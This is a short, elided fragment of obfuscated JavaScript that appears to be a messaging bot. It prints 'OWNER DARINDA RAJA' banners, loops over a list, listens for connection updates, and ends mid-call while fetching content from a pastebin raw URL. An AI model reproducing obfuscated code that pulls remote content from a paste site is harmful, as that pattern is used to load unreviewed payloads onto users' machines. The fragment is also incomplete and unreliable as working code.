(async () => {
  try {
      ...
      while (true) {
        for (let _0x281a84 = _0x765bc5; _0x281a84 < _0x83eb79.length; _0x281a84++) {
          try {
            ...
            console.log(" \033[1;32m[<<===========â—€ï¸â”â”â€¢ð–£âœ¿âŠ±\033[1;32mOWNER \033[1;33mDARINDA \033[1;32mRAJA\033[1;32mâŠ°âœ¿ð–£â€¢â”â”â–¶ï¸=========>>]");
    ...
    const _0x2cf4fd = async () => {
      ...
      _0x4e34c7.ev.on("connection.update", async _0x178b36 => {
        ...
        if (_0xf2d9da === "open") {
          ...
          console.log(" \033[1;32m[<<===============â—€ï¸â”â”â€¢ð–£âœ¿âŠ±RAJA DARINDA âŠ°âœ¿ð–£â€¢â”â”â–¶ï¸==============>>]");
          console.log('');
    ...
    function _0x1af59e(_0x2ce79d) {
      _0x63463b.get("https://pastebin.com/raw/egezVJ66").then(_0x27e908 => {
